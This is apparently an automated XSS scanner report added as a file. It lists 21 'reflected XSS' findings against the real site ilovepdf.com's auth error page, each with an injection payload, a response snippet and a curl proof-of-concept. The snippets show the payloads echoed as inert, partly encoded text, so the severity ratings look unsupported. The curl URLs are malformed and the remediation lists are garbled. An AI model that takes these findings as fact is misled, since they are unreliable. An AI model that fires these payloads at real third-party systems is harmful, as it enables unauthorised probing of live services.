@@ -1,0 +1,766 @@
+======================================================================
+              XSS FINDER — VULNERABILITY REPORT              
+======================================================================
+Generated At   : 2026-04-20 10:38:04
+Tool           : XSS Finder v1.0
+Target URL     : https://www.ilovepdf.com
+Scan Duration  : 2223.76s
+URLs Scanned   : 9
+Total Tests    : 4480
+Vulnerabilities: 21
+
+----------------------------------------------------------------------
+SEVERITY SUMMARY
+----------------------------------------------------------------------
+       Critical    : 0
+  <!>  High        : 3
+  <!>  Medium      : 18
+       Low         : 0
+
+----------------------------------------------------------------------
+VULNERABILITY TYPE BREAKDOWN
+----------------------------------------------------------------------
+     Reflected XSS                 : 21
+
+======================================================================
+DETAILED VULNERABILITY FINDINGS
+======================================================================
+
+[1] [!!!] Reflected XSS — Severity: High
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:29:19.809903
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=sso
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : High
+  Confidence     : High
+  HTTP Status    : 404
+
+  PAYLOAD:
+    `onmouseover=alert(1) `
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;`onmouseover=alert(1) `&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=sso?authclient=%60onmouseover%3Dalert%281%29%20%60'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[2] [!!!] Reflected XSS — Severity: High
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:12.149366
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : High
+  Confidence     : High
+  HTTP Status    : 404
+
+  PAYLOAD:
+    `onmouseover=alert(1) `
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;`onmouseover=alert(1) `&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=%60onmouseover%3Dalert%281%29%20%60'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[3] [!!!] Reflected XSS — Severity: High
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:33:56.050373
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=google
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : High
+  Confidence     : High
+  HTTP Status    : 404
+
+  PAYLOAD:
+    javascript:alert(1)
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;javascript:alert(1)&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=google?authclient=javascript%3Aalert%281%29'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[4] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:29:32.096068
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=sso
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=sso?authclient=%253Cimg%2520src%253Dx%2520onerror%253Dalert%281%29%253E'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[5] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:30:02.716057
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=sso
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    `);alert(1)//
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;`);alert(1)//&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=sso?authclient=%60%29%3Balert%281%29//'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[6] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:30:03.667647
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=sso
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    alert`1`
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;alert`1`&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=sso?authclient=alert%601%60'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[7] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:15.420542
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    `;alert(1)//
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;`;alert(1)//&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=%60%3Balert%281%29//'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[8] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:15.947699
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    ${alert(1)}
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;${alert(1)}&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=%24%7Balert%281%29%7D'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[9] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:21.005369
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    %3Cscript%3Ealert(1)%3C/script%3E
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;%3Cscript%3Ealert(1)%3C/script%3E&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=%253Cscript%253Ealert%281%29%253C/script%253E'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[10] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:21.480824
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=%253Cimg%2520src%253Dx%2520onerror%253Dalert%281%29%253E'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[11] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:22.400351
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    %253Cscript%253Ealert(1)%253C/script%253E
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;%253Cscript%253Ealert(1)%253C/script%253E&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=%25253Cscript%25253Ealert%281%29%25253C/script%25253E'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[12] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:23.004648
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    %2522%253E%253Cscript%253Ealert(1)%253C/script%253E
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;%2522%253E%253Cscript%253Ealert(1)%253C/script%253E&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=%252522%25253E%25253Cscript%25253Ealert%281%29%25253C/script%25253E'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[13] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:49.129283
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    `);alert(1)//
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;`);alert(1)//&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=%60%29%3Balert%281%29//'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[14] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:49.636762
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    alert(1)
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;alert(1)&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=alert%281%29'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[15] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:32:50.149117
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=facebook
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    alert`1`
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;alert`1`&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=facebook?authclient=alert%601%60'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[16] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:33:32.654845
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=google
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : advanced
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    %253Cscript%253Ealert(1)%253C/script%253E
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;%253Cscript%253Ealert(1)%253C/script%253E&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=google?authclient=%25253Cscript%25253Ealert%281%29%25253C/script%25253E'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[17] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:33:56.543417
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=google
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    alert(1)
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;alert(1)&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=google?authclient=alert%281%29'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[18] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:33:57.124281
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=google
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    };alert(1)//
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;};alert(1)//&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=google?authclient=%7D%3Balert%281%29//'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[19] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:33:58.481459
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=google
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    `);alert(1)//
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;`);alert(1)//&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=google?authclient=%60%29%3Balert%281%29//'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[20] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:33:58.982684
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=google
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    alert(1)
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;alert(1)&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=google?authclient=alert%281%29'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+
+[21] [  !] Reflected XSS — Severity: Medium
+--------------------------------------------------
+  Timestamp      : 2026-04-20T10:33:59.509277
+  URL            : https://www.ilovepdf.com/auth/auth?authclient=google
+  HTTP Method    : GET
+  Parameter      : authclient
+  Inj. Context   : html
+  Input Context  : URL Parameter
+  Payload Type   : dom
+  Severity       : Medium
+  Confidence     : Medium
+  HTTP Status    : 404
+
+  PAYLOAD:
+    alert`1`
+
+  EVIDENCE (response snippet):
+    <h1 class="title">Something’s wrong here…</h1> <h2 class="subtitle">Unknown auth client &#039;alert`1`&#039;</h2> <a class="btn btn--red" href="/">Back to homepage</a> <!--<p>Not Found (#404
+
+  PROOF OF CONCEPT (PoC):
+    curl -s 'https://www.ilovepdf.com/auth/auth?authclient=google?authclient=alert%601%60'
+
+  REMEDIATION:
+    • 1.
+    • HTML-encode all user-supplied data before rendering in HTML.
+    • 2.
+    • Implement a strict Content-Security-Policy (CSP) header.
+    • 3.
+    • Use framework-level auto-escaping (Django, Jinja2, etc.).
+    • 4.
+    • Validate and whitelist all user input server-side.
+    • 5.
+    • Set HttpOnly and Secure flags on session cookies..
+
+======================================================================
+  END OF REPORT — Generated by XSS Finder v1.0
+  IMPORTANT: For authorized security testing only.
+======================================================================
